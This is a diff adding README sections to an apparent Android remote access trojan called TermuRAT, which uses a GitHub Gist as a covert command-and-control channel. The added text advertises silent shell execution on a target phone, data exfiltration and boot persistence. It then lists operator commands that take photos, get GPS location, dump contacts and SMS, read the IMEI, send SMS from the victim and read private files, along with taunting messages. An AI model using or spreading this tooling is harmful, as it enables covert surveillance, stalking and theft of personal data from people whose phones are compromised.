@@ -77,3 +77,75 @@ Then run
 python target.py
 ```
 
+## 🧨 What Can You Do with TermuRAT?
+
+- 🔍 **Run Shell Commands**  
+  Execute any shell command on the target device—silently.
+
+- 📂 **Access Files**  
+  List directories, read file contents, or exfiltrate sensitive data.
+
+- 📸 **Use Device Sensors**  
+  If Termux:API is enabled, access location, battery status, or even take photos.
+
+- 🧾 **Install or Run Scripts**  
+  Deploy and run additional payloads or scripts on the fly.
+
+- 🔁 **Persistent Execution**  
+  With a little tweaking, make it auto-run at boot like a true lurker.
+
+- 📡 **Communicate Silently**  
+  No ports, no listeners—just GitHub being abused like a C2 server.
+
+> And yes, it all happens through a tiny GitHub Gist. Told you it was sneaky.
+
+## 🧪 Example Usage
+
+After launching `target.py`, you can use various commands. Some examples are given below:
+
+```
+termux-toast "You’ve been hacked 😈" [Display a toast message (for fun or trolling)]
+
+termux-vibrate -d 1000 [Vibrate the device for 1 second]
+
+termux-battery-status [Get battery level, charging status, and health]
+
+termux-location [Get the device's current GPS coordinates]
+
+termux-camera-photo -c 0 [Take a photo using the front camera]
+ 
+termux-camera-photo -c 1 [Take a photo using the rear camera]
+
+termux-sensor -l [List all available hardware sensors]
+
+termux-sensor -s accelerometer,gyroscope,light -n 2 | timeout 5 cat [Get real-time accelerometer data]
+
+termux-telephony-deviceinfo [Fetch device IMEI, carrier info, and more]
+
+termux-wifi-connectioninfo [Show current Wi-Fi connection details]
+  
+termux-contact-list [Dump all saved contacts]
+
+termux-sms-list [List received SMS messages]
+ 
+termux-sms-send -n 1234567890 "Yo, this phone is mine now." [Send an SMS from the target]
+
+termux-notification --title "Warning" --content "You’re being watched." [Push a custom notification]
+
+termux-dialog text [Show a prompt dialog (requires user input)]
+
+df -h [Show internal storage usage stats]
+
+ls /sdcard/ [List files in the device's internal storage]
+
+cat /sdcard/secret.txt [Read contents of a specific file]
+
+top -n 1 [Display real-time system resource usage]
+
+ps -A [List all running processes]  
+curl ifconfig.me [Get the device's public IP address]
+
+uptime [Check how long the device has been running]
+
+whoami [Display the current user (usually u0_aXXX in Termux)]
+```
